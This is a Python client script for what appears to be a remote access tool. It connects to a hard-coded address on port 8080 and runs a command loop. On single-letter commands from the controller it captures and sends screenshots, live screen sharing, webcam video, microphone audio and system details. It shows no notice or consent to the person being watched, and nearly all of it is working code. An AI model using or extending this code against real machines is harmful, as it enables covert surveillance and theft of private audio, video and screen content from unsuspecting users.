#!/usr/bin/env python3
import socket 
import sys
import platform
import webStreamer
import screenViewer
from PIL import ImageGrab

sock = socket.socket()
host = '192.168.0.101'
port = 8080

def connect():
    try:
        sock.connect((host,port))
        print("Connected to server: " + host)
    except:
        print("Failed connecting to server!...")
        sys.exit()

def isCompatible():
    my_OS = platform.system()   
    sock.send(my_OS.encode()) 
    
    #continue running only if client is on Windows (Linux not tested yet.)
    if my_OS != "Darwin":
        server_OS = sock.recv(1024).decode() #check server platform 
        if server_OS != "Darwin":
            return True

    return False

def sysFetch():
    #operating system and some minimal kernel inforrmation
    os = platform.platform() 
    sock.send(os.encode())
    s = sock.recv(1024).decode()

    #display
    img = ImageGrab.grab() #take a screenshot that will have the size of native screen resolution
    width, height = img.size
    sock.send(str(width).encode())
    s = sock.recv(1024).decode()
    sock.send(str(height).encode())
    s = sock.recv(1024).decode()

    return width, height

def ControlCenter():
    while True:    
        cmd = sock.recv(1024).decode()
        
        if cmd == "S" or cmd == "s":
            W, H = sysFetch()
            screenViewer.Screenshot(sock, W, H).take_screenshot()
        elif cmd == "R" or cmd == "r":
            W, H = sysFetch()
            screenViewer.ShareScreen(sock, W, H).sendScreen()
        elif cmd == "W" or cmd == "w":
            webStreamer.VideoStreamer(sock).sendVideo()
        elif cmd == "M" or cmd == "m":
            # this part works only on Windows and Linux (need to check and stop if OS X is used)
            if isCompatible():
                webStreamer.MicStreamer(sock).sendMic()
        elif cmd == "D" or cmd == "d":
            sysFetch()
        else:
            print("\nServer closed - Exiting...")
            sock.close()
            sys.exit()
            break 
   
if __name__ == '__main__':
    connect()
    ControlCenter()
